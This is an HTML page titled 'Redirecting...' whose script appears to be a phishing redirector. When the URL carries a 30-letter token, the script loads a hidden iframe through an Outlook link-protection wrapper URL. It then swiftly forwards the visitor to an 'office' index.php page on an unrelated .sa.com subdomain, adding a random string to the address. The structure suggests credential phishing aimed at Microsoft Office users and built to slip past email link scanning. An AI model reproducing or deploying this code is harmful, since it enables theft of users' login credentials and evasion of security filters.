<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // First temporary redirect URL (never visible to the user)
        const firstRedirectUrl = "https://shared.outlook.inky.com/link?domain=m3.ryltvk6.sa.com&t=h.eJxNj00OgyAQha_SsK7QESroyqvAMKipigFcNb17S9NFl-_vS96TnWllw4XNpRx5ECLjTP5cqYnJU2rQ7kfMhWfLMW7iSLEQliafaSLuI2Z2vbBHBexUPs1FLHuI4098N2BvzijVd4j3tncudL31wSiwZHUAEKCl0RpabbiU0CpZmVSZiRytyz6NG25QYTXxNfk3Sj0ArzfMMz7v.MEUCICEI6i6CrVDJsTqv-D44iSjB0FjCgezb02LsAX3GOiU0AiEAwjl5CQtCOIupbdWlks66hThKXby0D20e3FdLQidqhHo";

        // Final destination URL
        const finalRedirectUrl = "https://m3.ryltvk6.sa.com/m3.secure.zcore/office-3D8/index.php";

        // Function to generate a random string (80 characters)
        function generateRandomString(length) {
            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            let result = "";
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        // Function to extract the unnamed query parameter after '?='
        function getUnnamedQueryParam() {
            const query = window.location.search;
            const match = query.match(/^\?=([A-Z]{30})$/); // Matches "?=30-uppercase-letters"
            return match ? match[1] : null;
        }

        // Extract the 30-character uppercase string
        const upperString = getUnnamedQueryParam();

        if (upperString) {
            // Generate a random 80-character string
            const randomString = generateRandomString(80);

            // First redirect (hidden)
            const hiddenIframe = document.createElement("iframe");
            hiddenIframe.style.display = "none";
            hiddenIframe.src = firstRedirectUrl;
            document.body.appendChild(hiddenIframe);

            // Redirect to final URL within 100ms (effectively instant)
            setTimeout(() => {
                window.location.replace(`${finalRedirectUrl}?=${randomString}`);
            }, 100);
        }
    </script>
</head>
<body>
</body>
</html>
